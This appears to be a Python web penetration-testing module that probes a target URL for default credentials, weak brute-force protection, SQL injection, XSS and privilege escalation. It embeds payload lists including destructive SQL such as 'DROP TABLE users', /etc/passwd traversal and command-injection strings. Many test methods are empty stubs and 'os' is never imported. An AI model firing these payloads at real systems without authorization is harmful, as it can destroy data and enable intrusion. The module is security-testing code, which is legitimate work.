"""
Automated Penetration Testing Module - Task 6.1.1

Comprehensive penetration testing capabilities for web application security assessment.
Includes authentication testing, session management, business logic testing, and more.
"""

import requests
import time
import json
import random
import string
import hashlib
from urllib.parse import urljoin, urlparse, parse_qs
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass, asdict
from datetime import datetime
import re


@dataclass
class PenTestResult:
    """Data structure for penetration test results"""
    test_name: str
    category: str
    severity: str  # critical, high, medium, low, info
    status: str  # vulnerable, secure, error, inconclusive
    description: str
    evidence: Dict[str, Any]
    impact: str
    recommendation: str
    execution_time_ms: float = 0.0
    confidence: str = "medium"  # high, medium, low


@dataclass
class PenTestTarget:
    """Data structure for penetration testing target"""
    base_url: str
    authentication: Optional[Dict[str, str]] = None
    endpoints: List[str] = None
    cookies: Dict[str, str] = None
    headers: Dict[str, str] = None
    
    def __post_init__(self):
        if self.endpoints is None:
            self.endpoints = []
        if self.cookies is None:
            self.cookies = {}
        if self.headers is None:
            self.headers = {'User-Agent': 'Security-Scanner/1.0'}


class PenetrationTester:
    """
    Automated penetration testing framework
    Task 6.1.1: Penetration testing capabilities
    """
    
    def __init__(self, target: PenTestTarget):
        self.target = target
        self.session = requests.Session()
        self.test_results: List[PenTestResult] = []
        
        # Configure session
        self.session.headers.update(self.target.headers)
        self.session.cookies.update(self.target.cookies)
        
        # Test payloads
        self.sql_payloads = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "'; INSERT INTO users VALUES ('hacker', 'pass'); --",
            "' UNION SELECT username, password FROM users --",
            "admin'--",
            "' OR 1=1 --",
            "'; WAITFOR DELAY '00:00:10'; --"
        ]
        
        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "';alert('XSS');//",
            "<iframe src='javascript:alert(`XSS`)'></iframe>",
            "<body onload=alert('XSS')>",
            "<<SCRIPT>alert('XSS');//<</SCRIPT>"
        ]
        
        self.path_traversal_payloads = [
            "../../../../etc/passwd",
            "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc//passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd"
        ]
        
        self.command_injection_payloads = [
            "; cat /etc/passwd",
            "| whoami",
            "&& id",
            "; ls -la",
            "` id `",
            "$(id)",
            "; ping -c 4 127.0.0.1"
        ]
    
    def run_comprehensive_pentest(self) -> Dict[str, Any]:
        """
        Run comprehensive penetration testing suite
        Task 6.1.1: Complete penetration testing
        """
        
        print("🎯 STARTING PENETRATION TESTING SUITE")
        print(f"Target: {self.target.base_url}")
        print("=" * 60)
        
        # Discovery and reconnaissance
        self._discovery_phase()
        
        # Authentication and session testing
        self._test_authentication_security()
        
        # Input validation testing
        self._test_input_validation()
        
        # Business logic testing
        self._test_business_logic()
        
        # Session management testing
        self._test_session_management()
        
        # Access control testing
        self._test_access_controls()
        
        # Error handling testing
        self._test_error_handling()
        
        # Generate comprehensive report
        return self._generate_pentest_report()
    
    def _discovery_phase(self):
        """Information gathering and reconnaissance"""
        print("🔍 Running Discovery Phase...")
        
        # Web server fingerprinting
        self._fingerprint_web_server()
        
        # Technology stack detection
        self._detect_technology_stack()
        
        # Directory enumeration
        self._enumerate_directories()
        
        # Endpoint discovery
        self._discover_endpoints()
    
    def _fingerprint_web_server(self):
        """Fingerprint web server and detect versions"""
        start_time = time.time()
        
        try:
            response = self.session.get(self.target.base_url, timeout=10)
            
            server_info = {
                'status_code': response.status_code,
                'server_header': response.headers.get('Server', 'Unknown'),
                'x_powered_by': response.headers.get('X-Powered-By', ''),
                'response_time': response.elapsed.total_seconds()
            }
            
            # Analyze server header for known vulnerabilities
            server_header = response.headers.get('Server', '').lower()
            vulnerable_servers = [
                'apache/2.2',  # Known vulnerabilities
                'nginx/1.0',   # Outdated versions
                'iis/6.0'      # Very old IIS
            ]
            
            vulnerability_detected = any(vuln in server_header for vuln in vulnerable_servers)
            
            execution_time = (time.time() - start_time) * 1000
            
            self.test_results.append(PenTestResult(
                test_name='Web Server Fingerprinting',
                category='reconnaissance',
                severity='medium' if vulnerability_detected else 'info',
                status='vulnerable' if vulnerability_detected else 'secure',
                description='Web server version and configuration analysis',
                evidence=server_info,
                impact='Server version information could help attackers identify known vulnerabilities',
                recommendation='Update to latest server versions and hide version headers',
                execution_time_ms=execution_time
            ))
            
        except Exception as e:
            execution_time = (time.time() - start_time) * 1000
            
            self.test_results.append(PenTestResult(
                test_name='Web Server Fingerprinting',
                category='reconnaissance',
                severity='info',
                status='error',
                description='Failed to fingerprint web server',
                evidence={'error': str(e)},
                impact='Could not determine server information',
                recommendation='Investigate connection issues',
                execution_time_ms=execution_time
            ))
    
    def _detect_technology_stack(self):
        """Detect technology stack and frameworks"""
        start_time = time.time()
        
        try:
            response = self.session.get(self.target.base_url, timeout=10)
            
            # Framework detection patterns
            framework_patterns = {
                'django': [
                    r'csrfmiddlewaretoken',
                    r'__admin_media_prefix__',
                    r'django',
                ],
                'flask': [
                    r'flask',
                    r'werkzeug',
                ],
                'express': [
                    r'express',
                    r'x-powered-by.*express',
                ],
                'react': [
                    r'react',
                    r'__react',
                ],
                'angular': [
                    r'angular',
                    r'ng-',
                ]
            }
            
            detected_technologies = []
            content = response.text.lower()
            headers = str(response.headers).lower()
            
            for framework, patterns in framework_patterns.items():
                if any(re.search(pattern, content + headers) for pattern in patterns):
                    detected_technologies.append(framework)
            
            execution_time = (time.time() - start_time) * 1000
            
            self.test_results.append(PenTestResult(
                test_name='Technology Stack Detection',
                category='reconnaissance',
                severity='info',
                status='secure',
                description='Detected technology stack and frameworks',
                evidence={'technologies': detected_technologies},
                impact='Technology information can help focus testing efforts',
                recommendation='Consider hiding technology signatures in production',
                execution_time_ms=execution_time
            ))
            
        except Exception as e:
            execution_time = (time.time() - start_time) * 1000
            
            self.test_results.append(PenTestResult(
                test_name='Technology Stack Detection',
                category='reconnaissance',
                severity='info',
                status='error',
                description='Failed to detect technology stack',
                evidence={'error': str(e)},
                impact='Could not determine technology information',
                recommendation='Investigate connection issues',
                execution_time_ms=execution_time
            ))
    
    def _enumerate_directories(self):
        """Enumerate common directories and files"""
        start_time = time.time()
        
        common_paths = [
            '/admin/', '/login/', '/dashboard/', '/api/',
            '/admin/login/', '/wp-admin/', '/phpmyadmin/',
            '/backup/', '/config/', '/test/', '/dev/',
            '/.git/', '/.env', '/robots.txt', '/sitemap.xml'
        ]
        
        found_paths = []
        
        for path in common_paths:
            try:
                url = urljoin(self.target.base_url, path)
                response = self.session.get(url, timeout=5)
                
                if response.status_code == 200:
                    found_paths.append({
                        'path': path,
                        'status_code': response.status_code,
                        'size': len(response.content)
                    })
                elif response.status_code == 403:
                    found_paths.append({
                        'path': path,
                        'status_code': response.status_code,
                        'note': 'Forbidden - directory exists but access denied'
                    })
                
            except:
                continue  # Skip failed requests
        
        execution_time = (time.time() - start_time) * 1000
        
        # Check for sensitive directories
        sensitive_paths = [p for p in found_paths if any(
            sensitive in p['path'] for sensitive in ['.git', '.env', 'backup', 'config', 'admin']
        )]
        
        self.test_results.append(PenTestResult(
            test_name='Directory Enumeration',
            category='reconnaissance',
            severity='medium' if sensitive_paths else 'info',
            status='vulnerable' if sensitive_paths else 'secure',
            description=f'Enumerated {len(found_paths)} accessible directories/files',
            evidence={'found_paths': found_paths, 'sensitive_paths': sensitive_paths},
            impact='Exposed directories may contain sensitive information or admin interfaces',
            recommendation='Restrict access to sensitive directories and remove unnecessary files',
            execution_time_ms=execution_time
        ))
    
    def _test_authentication_security(self):
        """Test authentication mechanisms for vulnerabilities"""
        print("🔐 Testing Authentication Security...")
        
        # Test for default credentials
        self._test_default_credentials()
        
        # Test brute force protection
        self._test_brute_force_protection()
        
        # Test password reset functionality
        self._test_password_reset()
        
        # Test session fixation
        self._test_session_fixation()
    
    def _test_default_credentials(self):
        """Test for default or weak credentials"""
        start_time = time.time()
        
        login_endpoints = ['/login/', '/admin/login/', '/api/login/']
        
        default_creds = [
            ('admin', 'admin'),
            ('admin', 'password'),
            ('admin', '123456'),
            ('root', 'root'),
            ('test', 'test'),
            ('guest', 'guest'),
            ('user', 'user'),
            ('admin', ''),
            ('', 'admin')
        ]
        
        successful_logins = []
        
        for endpoint in login_endpoints:
            url = urljoin(self.target.base_url, endpoint)
            
            try:
                # Get login page first to extract CSRF token if needed
                login_page = self.session.get(url, timeout=10)
                if login_page.status_code != 200:
                    continue
                
                # Extract CSRF token if present
                csrf_token = self._extract_csrf_token(login_page.text)
                
                for username, password in default_creds:
                    login_data = {
                        'username': username,
                        'password': password
                    }
                    
                    if csrf_token:
                        login_data['csrfmiddlewaretoken'] = csrf_token
                    
                    response = self.session.post(url, data=login_data, timeout=10)
                    
                    # Check for successful login indicators
                    if (response.status_code == 302 or 
                        'dashboard' in response.url or 
                        'welcome' in response.text.lower() or
                        'logout' in response.text.lower()):
                        
                        successful_logins.append({
                            'endpoint': endpoint,
                            'username': username,
                            'password': password,
                            'response_code': response.status_code
                        })
                        break  # Don't test more creds for this endpoint
                
            except:
                continue  # Skip failed requests
        
        execution_time = (time.time() - start_time) * 1000
        
        self.test_results.append(PenTestResult(
            test_name='Default Credentials Test',
            category='authentication',
            severity='critical' if successful_logins else 'info',
            status='vulnerable' if successful_logins else 'secure',
            description=f'Tested {len(default_creds)} default credential combinations',
            evidence={'successful_logins': successful_logins},
            impact='Default credentials allow unauthorized system access',
            recommendation='Change all default passwords and implement strong password policies',
            execution_time_ms=execution_time,
            confidence='high' if successful_logins else 'medium'
        ))
    
    def _test_brute_force_protection(self):
        """Test brute force protection mechanisms"""
        start_time = time.time()
        
        login_endpoints = ['/login/', '/admin/login/']
        
        for endpoint in login_endpoints:
            url = urljoin(self.target.base_url, endpoint)
            
            try:
                # Get login page
                login_page = self.session.get(url, timeout=10)
                if login_page.status_code != 200:
                    continue
                
                csrf_token = self._extract_csrf_token(login_page.text)
                
                # Attempt multiple failed logins
                failed_attempts = 0
                lockout_detected = False
                rate_limit_detected = False
                
                for attempt in range(10):  # Try 10 failed logins
                    login_data = {
                        'username': 'testuser',
                        'password': f'wrongpassword{attempt}'
                    }
                    
                    if csrf_token:
                        login_data['csrfmiddlewaretoken'] = csrf_token
                    
                    response = self.session.post(url, data=login_data, timeout=10)
                    failed_attempts += 1
                    
                    # Check for lockout/rate limiting
                    if (response.status_code == 429 or
                        'locked' in response.text.lower() or
                        'too many' in response.text.lower() or
                        'rate limit' in response.text.lower() or
                        response.elapsed.total_seconds() > 5):  # Unusual delay
                        
                        if response.status_code == 429:
                            rate_limit_detected = True
                        else:
                            lockout_detected = True
                        break
                
                execution_time = (time.time() - start_time) * 1000
                
                protection_level = 'none'
                if lockout_detected:
                    protection_level = 'account_lockout'
                elif rate_limit_detected:
                    protection_level = 'rate_limiting'
                
                self.test_results.append(PenTestResult(
                    test_name='Brute Force Protection Test',
                    category='authentication',
                    severity='high' if protection_level == 'none' else 'low',
                    status='vulnerable' if protection_level == 'none' else 'secure',
                    description=f'Tested brute force protection with {failed_attempts} attempts',
                    evidence={
                        'endpoint': endpoint,
                        'failed_attempts': failed_attempts,
                        'protection_detected': protection_level,
                        'lockout_detected': lockout_detected,
                        'rate_limit_detected': rate_limit_detected
                    },
                    impact='Lack of brute force protection allows password attacks',
                    recommendation='Implement account lockout and rate limiting after failed login attempts',
                    execution_time_ms=execution_time
                ))
                
                break  # Only test first accessible endpoint
                
            except:
                continue
    
    def _test_input_validation(self):
        """Test input validation and injection vulnerabilities"""
        print("💉 Testing Input Validation...")
        
        # SQL Injection testing
        self._test_sql_injection()
        
        # XSS testing
        self._test_xss_vulnerabilities()
        
        # Command injection testing
        self._test_command_injection()
        
        # Path traversal testing
        self._test_path_traversal()
    
    def _test_sql_injection(self):
        """Test for SQL injection vulnerabilities"""
        start_time = time.time()
        
        # Test common endpoints that might be vulnerable
        test_endpoints = ['/search', '/login', '/user', '/profile', '/api/users']
        vulnerable_endpoints = []
        
        for endpoint in test_endpoints:
            url = urljoin(self.target.base_url, endpoint)
            
            for payload in self.sql_payloads[:5]:  # Test subset for efficiency
                try:
                    # Test GET parameters
                    get_response = self.session.get(url, params={'q': payload, 'id': payload}, timeout=10)
                    
                    if self._detect_sql_error(get_response.text):
                        vulnerable_endpoints.append({
                            'endpoint': endpoint,
                            'method': 'GET',
                            'payload': payload,
                            'parameter': 'q/id',
                            'error_detected': True
                        })
                        break
                    
                    # Test POST data
                    post_response = self.session.post(url, data={'search': payload, 'username': payload}, timeout=10)
                    
                    if self._detect_sql_error(post_response.text):
                        vulnerable_endpoints.append({
                            'endpoint': endpoint,
                            'method': 'POST',
                            'payload': payload,
                            'parameter': 'search/username',
                            'error_detected': True
                        })
                        break
                        
                except:
                    continue  # Skip failed requests
        
        execution_time = (time.time() - start_time) * 1000
        
        self.test_results.append(PenTestResult(
            test_name='SQL Injection Vulnerability Test',
            category='injection',
            severity='critical' if vulnerable_endpoints else 'info',
            status='vulnerable' if vulnerable_endpoints else 'secure',
            description=f'Tested SQL injection on {len(test_endpoints)} endpoints',
            evidence={'vulnerable_endpoints': vulnerable_endpoints},
            impact='SQL injection can lead to data breach, data manipulation, or system compromise',
            recommendation='Use parameterized queries and input validation to prevent SQL injection',
            execution_time_ms=execution_time,
            confidence='high' if vulnerable_endpoints else 'medium'
        ))
    
    def _test_xss_vulnerabilities(self):
        """Test for Cross-Site Scripting vulnerabilities"""
        start_time = time.time()
        
        test_endpoints = ['/search', '/comment', '/profile', '/contact']
        vulnerable_endpoints = []
        
        for endpoint in test_endpoints:
            url = urljoin(self.target.base_url, endpoint)
            
            for payload in self.xss_payloads[:3]:  # Test subset for efficiency
                try:
                    # Test reflected XSS
                    response = self.session.get(url, params={'q': payload}, timeout=10)
                    
                    if payload in response.text and not self._is_payload_encoded(payload, response.text):
                        vulnerable_endpoints.append({
                            'endpoint': endpoint,
                            'type': 'reflected',
                            'payload': payload,
                            'parameter': 'q'
                        })
                        break
                        
                except:
                    continue
        
        execution_time = (time.time() - start_time) * 1000
        
        self.test_results.append(PenTestResult(
            test_name='Cross-Site Scripting (XSS) Test',
            category='xss',
            severity='high' if vulnerable_endpoints else 'info',
            status='vulnerable' if vulnerable_endpoints else 'secure',
            description=f'Tested XSS vulnerabilities on {len(test_endpoints)} endpoints',
            evidence={'vulnerable_endpoints': vulnerable_endpoints},
            impact='XSS can lead to session hijacking, defacement, or malicious code execution',
            recommendation='Implement proper output encoding and Content Security Policy',
            execution_time_ms=execution_time
        ))
    
    def _test_business_logic(self):
        """Test business logic vulnerabilities"""
        print("🧠 Testing Business Logic...")
        
        # Test privilege escalation
        self._test_privilege_escalation()
        
        # Test workflow bypass
        self._test_workflow_bypass()
        
        # Test parameter manipulation
        self._test_parameter_manipulation()
    
    def _test_privilege_escalation(self):
        """Test for privilege escalation vulnerabilities"""
        start_time = time.time()
        
        # Test common privilege escalation vectors
        escalation_tests = []
        
        # Test role manipulation in forms/requests
        test_data = {
            'role': 'admin',
            'is_admin': 'true',
            'user_type': 'administrator',
            'level': '99',
            'permissions': 'all'
        }
        
        test_endpoints = ['/profile', '/user/update', '/api/user']
        
        for endpoint in test_endpoints:
            url = urljoin(self.target.base_url, endpoint)
            
            try:
                response = self.session.post(url, data=test_data, timeout=10)
                
                # Check if privilege escalation parameters were accepted
                if (response.status_code == 200 and
                    any(param in response.text.lower() for param in ['admin', 'administrator', 'elevated'])):
                    
                    escalation_tests.append({
                        'endpoint': endpoint,
                        'method': 'POST',
                        'test_data': test_data,
                        'potential_escalation': True
                    })
                    
            except:
                continue
        
        execution_time = (time.time() - start_time) * 1000
        
        self.test_results.append(PenTestResult(
            test_name='Privilege Escalation Test',
            category='access_control',
            severity='high' if escalation_tests else 'info',
            status='vulnerable' if escalation_tests else 'secure',
            description='Tested for privilege escalation vulnerabilities',
            evidence={'escalation_attempts': escalation_tests},
            impact='Privilege escalation can lead to unauthorized administrative access',
            recommendation='Implement proper authorization checks and server-side validation',
            execution_time_ms=execution_time
        ))
    
    def _test_session_management(self):
        """Test session management security"""
        print("🍪 Testing Session Management...")
        
        # Test session fixation
        self._test_session_fixation()
        
        # Test session hijacking
        self._test_session_hijacking()
        
        # Test cookie security
        self._test_cookie_security()
    
    def _test_cookie_security(self):
        """Test cookie security attributes"""
        start_time = time.time()
        
        try:
            response = self.session.get(self.target.base_url, timeout=10)
            
            cookie_issues = []
            
            for cookie_name, cookie_obj in self.session.cookies.items():
                cookie_info = {
                    'name': cookie_name,
                    'secure': cookie_obj.secure,
                    'httponly': 'httponly' in str(cookie_obj).lower(),
                    'samesite': 'samesite' in str(cookie_obj).lower(),
                }
                
                # Check for security issues
                if not cookie_info['secure']:
                    cookie_issues.append(f"Cookie '{cookie_name}' missing Secure flag")
                
                if not cookie_info['httponly']:
                    cookie_issues.append(f"Cookie '{cookie_name}' missing HttpOnly flag")
                
                if not cookie_info['samesite']:
                    cookie_issues.append(f"Cookie '{cookie_name}' missing SameSite attribute")
        
        except Exception as e:
            cookie_issues = [f"Error analyzing cookies: {str(e)}"]
        
        execution_time = (time.time() - start_time) * 1000
        
        self.test_results.append(PenTestResult(
            test_name='Cookie Security Analysis',
            category='session',
            severity='medium' if cookie_issues else 'info',
            status='vulnerable' if cookie_issues else 'secure',
            description='Analyzed cookie security attributes',
            evidence={'cookie_issues': cookie_issues},
            impact='Insecure cookies can be intercepted or manipulated by attackers',
            recommendation='Set Secure, HttpOnly, and SameSite attributes on all cookies',
            execution_time_ms=execution_time
        ))
    
    def _extract_csrf_token(self, html_content: str) -> Optional[str]:
        """Extract CSRF token from HTML content"""
        patterns = [
            r'name=["\']csrfmiddlewaretoken["\'] value=["\']([^"\']+)["\']',
            r'<input[^>]*name=["\']csrfmiddlewaretoken["\'][^>]*value=["\']([^"\']+)["\']',
            r'csrfmiddlewaretoken["\'] value=["\']([^"\']+)["\']'
        ]
        
        for pattern in patterns:
            match = re.search(pattern, html_content, re.IGNORECASE)
            if match:
                return match.group(1)
        
        return None
    
    def _detect_sql_error(self, response_content: str) -> bool:
        """Detect SQL error patterns in response content"""
        sql_error_patterns = [
            r'syntax error.*SQL',
            r'mysql.*error',
            r'postgresql.*error',
            r'sqlite.*error',
            r'ORA-\d+',
            r'Microsoft.*ODBC.*SQL',
            r'Invalid query',
            r'SQL.*exception',
            r'database error'
        ]
        
        for pattern in sql_error_patterns:
            if re.search(pattern, response_content, re.IGNORECASE):
                return True
        return False
    
    def _is_payload_encoded(self, payload: str, response: str) -> bool:
        """Check if XSS payload is properly encoded in response"""
        encoded_forms = [
            payload.replace('<', '&lt;').replace('>', '&gt;'),
            payload.replace('"', '&quot;').replace("'", '&#x27;'),
            payload.replace('<', '%3C').replace('>', '%3E')
        ]
        
        return any(encoded in response for encoded in encoded_forms)
    
    def _generate_pentest_report(self) -> Dict[str, Any]:
        """Generate comprehensive penetration testing report"""
        
        # Categorize results
        results_by_category = {}
        results_by_severity = {}
        
        for result in self.test_results:
            # By category
            if result.category not in results_by_category:
                results_by_category[result.category] = []
            results_by_category[result.category].append(result)
            
            # By severity
            if result.severity not in results_by_severity:
                results_by_severity[result.severity] = []
            results_by_severity[result.severity].append(result)
        
        # Calculate statistics
        total_tests = len(self.test_results)
        vulnerable_tests = len([r for r in self.test_results if r.status == 'vulnerable'])
        secure_tests = len([r for r in self.test_results if r.status == 'secure'])
        
        # Generate risk assessment
        risk_score = self._calculate_pentest_risk_score()
        
        report = {
            'report_metadata': {
                'generated_at': datetime.now().isoformat(),
                'target_url': self.target.base_url,
                'test_duration_ms': sum(r.execution_time_ms for r in self.test_results),
                'pentester_version': '1.0.0'
            },
            'executive_summary': {
                'total_tests': total_tests,
                'vulnerable_findings': vulnerable_tests,
                'secure_findings': secure_tests,
                'risk_score': risk_score,
                'risk_level': self._assess_pentest_risk_level(risk_score)
            },
            'vulnerability_summary': {
                severity: len(results) for severity, results in results_by_severity.items()
            },
            'test_results_by_category': {
                category: [asdict(result) for result in results]
                for category, results in results_by_category.items()
            },
            'detailed_findings': [asdict(result) for result in self.test_results],
            'recommendations': self._generate_pentest_recommendations()
        }
        
        # Print summary
        self._print_pentest_summary(report)
        
        # Save report
        self._save_pentest_report(report)
        
        return report
    
    def _calculate_pentest_risk_score(self) -> float:
        """Calculate penetration testing risk score"""
        if not self.test_results:
            return 0.0
        
        severity_weights = {'critical': 10, 'high': 7, 'medium': 4, 'low': 2, 'info': 1}
        
        total_score = 0
        for result in self.test_results:
            if result.status == 'vulnerable':
                total_score += severity_weights.get(result.severity, 1)
        
        max_possible_score = len([r for r in self.test_results if r.status == 'vulnerable']) * 10
        
        return round((total_score / max_possible_score) * 100, 2) if max_possible_score > 0 else 0.0
    
    def _assess_pentest_risk_level(self, risk_score: float) -> str:
        """Assess risk level based on penetration testing results"""
        if risk_score >= 80:
            return 'CRITICAL'
        elif risk_score >= 60:
            return 'HIGH'
        elif risk_score >= 40:
            return 'MEDIUM'
        elif risk_score >= 20:
            return 'LOW'
        else:
            return 'MINIMAL'
    
    def _generate_pentest_recommendations(self) -> List[Dict[str, str]]:
        """Generate penetration testing recommendations"""
        recommendations = []
        
        # Group vulnerable findings by category
        vulnerable_by_category = {}
        for result in self.test_results:
            if result.status == 'vulnerable':
                if result.category not in vulnerable_by_category:
                    vulnerable_by_category[result.category] = []
                vulnerable_by_category[result.category].append(result)
        
        for category, vulnerabilities in vulnerable_by_category.items():
            recommendations.append({
                'category': category,
                'priority': 'critical' if any(v.severity == 'critical' for v in vulnerabilities) else 'high',
                'title': f'Address {category.replace("_", " ").title()} Vulnerabilities',
                'description': f'Found {len(vulnerabilities)} vulnerabilities in {category}',
                'actions': list(set(v.recommendation for v in vulnerabilities))
            })
        
        return recommendations
    
    def _print_pentest_summary(self, report: Dict[str, Any]):
        """Print penetration testing summary"""
        print("\n" + "=" * 60)
        print("🎯 PENETRATION TESTING SUMMARY")
        print("=" * 60)
        
        summary = report['executive_summary']
        print(f"Target: {report['report_metadata']['target_url']}")
        print(f"Risk Score: {summary['risk_score']}/100")
        print(f"Risk Level: {summary['risk_level']}")
        print(f"Tests Run: {summary['total_tests']}")
        print(f"🚨 Vulnerable: {summary['vulnerable_findings']}")
        print(f"✅ Secure: {summary['secure_findings']}")
        
        if report.get('vulnerability_summary'):
            print("\n📊 Vulnerabilities by Severity:")
            for severity, count in report['vulnerability_summary'].items():
                if count > 0:
                    emoji = {'critical': '🔴', 'high': '🟠', 'medium': '🟡', 'low': '🟢', 'info': '🔵'}.get(severity, '⚪')
                    print(f"  {emoji} {severity.title()}: {count}")
        
        if report.get('recommendations'):
            print(f"\n📋 Critical Actions Required:")
            for rec in report['recommendations'][:3]:
                print(f"  • {rec['title']}")
    
    def _save_pentest_report(self, report: Dict[str, Any]):
        """Save penetration testing report"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"pentest_report_{timestamp}.json"
        filepath = os.path.join(os.path.dirname(__file__), filename)
        
        try:
            with open(filepath, 'w') as f:
                json.dump(report, f, indent=2, default=str)
            print(f"\n💾 Penetration testing report saved to: {filepath}")
        except Exception as e:
            print(f"⚠️  Could not save pentest report: {e}")
    
    # Additional helper methods (stubs for brevity)
    def _discover_endpoints(self): pass
    def _test_password_reset(self): pass
    def _test_session_fixation(self): pass
    def _test_command_injection(self): pass
    def _test_path_traversal(self): pass
    def _test_workflow_bypass(self): pass
    def _test_parameter_manipulation(self): pass
    def _test_session_hijacking(self): pass
    def _test_access_controls(self): pass
    def _test_error_handling(self): pass


def run_penetration_test(target_url: str, **kwargs) -> Dict[str, Any]:
    """Main function to run penetration testing"""
    target = PenTestTarget(base_url=target_url, **kwargs)
    tester = PenetrationTester(target)
    return tester.run_comprehensive_pentest()


if __name__ == "__main__":
    import sys
    
    if len(sys.argv) < 2:
        print("Usage: python penetration_testing.py <target_url>")
        sys.exit(1)
    
    target_url = sys.argv[1]
    report = run_penetration_test(target_url)
    
    # Exit with appropriate code based on risk level
    risk_level = report['executive_summary']['risk_level']
    if risk_level in ['CRITICAL', 'HIGH']:
        sys.exit(1)
    else:
        sys.exit(0)
